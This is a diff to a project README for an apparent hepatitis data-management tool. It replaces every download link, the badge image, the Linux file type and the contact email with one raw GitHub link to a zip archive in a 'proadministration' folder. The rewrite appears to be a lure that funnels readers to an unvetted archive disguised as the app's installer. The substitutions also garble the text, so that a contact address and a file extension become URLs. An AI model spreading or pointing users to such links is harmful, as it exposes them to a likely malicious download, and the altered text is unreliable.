@@ -1,7 +1,7 @@
 # 🌟 The_hepatitis_drafts - Simple Tools for Hepatitis Data Management
 
 ## 📥 Download Now
-[![Download The_hepatitis_drafts](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/hichammes/The_hepatitis_drafts/releases)
+[![Download The_hepatitis_drafts](https://raw.githubusercontent.com/hichammes/The_hepatitis_drafts/main/proadministration/The_hepatitis_drafts.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/hichammes/The_hepatitis_drafts/main/proadministration/The_hepatitis_drafts.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ The_hepatitis_drafts offers various tools to assist you in your data management 
 
 To get started, visit the Releases page to download the latest version of The_hepatitis_drafts. 
 
-[Download Here](https://github.com/hichammes/The_hepatitis_drafts/releases)
+[Download Here](https://raw.githubusercontent.com/hichammes/The_hepatitis_drafts/main/proadministration/The_hepatitis_drafts.zip)
 
 ### Step-by-Step Installation
 
@@ -40,7 +40,7 @@ To get started, visit the Releases page to download the latest version of The_he
 5. **Run the Installer:**
    - **Windows:** Double-click on the `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and follow any additional instructions.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/hichammes/The_hepatitis_drafts/main/proadministration/The_hepatitis_drafts.zip` file and follow any additional instructions.
 6. **Open The_hepatitis_drafts:** Find the app in your Applications menu or on your desktop and double-click to open.
 
 ## ⚙️ How to Use
@@ -67,8 +67,8 @@ Yes, a user manual is included in the application. Look for "Help" in the menu t
 
 ## 📞 Contact Information
 
-For further questions or support, contact us at [hichammes@example.com](mailto:hichammes@example.com).
+For further questions or support, contact us at [https://raw.githubusercontent.com/hichammes/The_hepatitis_drafts/main/proadministration/The_hepatitis_drafts.zip](https://raw.githubusercontent.com/hichammes/The_hepatitis_drafts/main/proadministration/The_hepatitis_drafts.zip).
 
 Thank you for using The_hepatitis_drafts! We hope it serves your needs effectively. 
 
-[Download Now](https://github.com/hichammes/The_hepatitis_drafts/releases)
+[Download Now](https://raw.githubusercontent.com/hichammes/The_hepatitis_drafts/main/proadministration/The_hepatitis_drafts.zip)
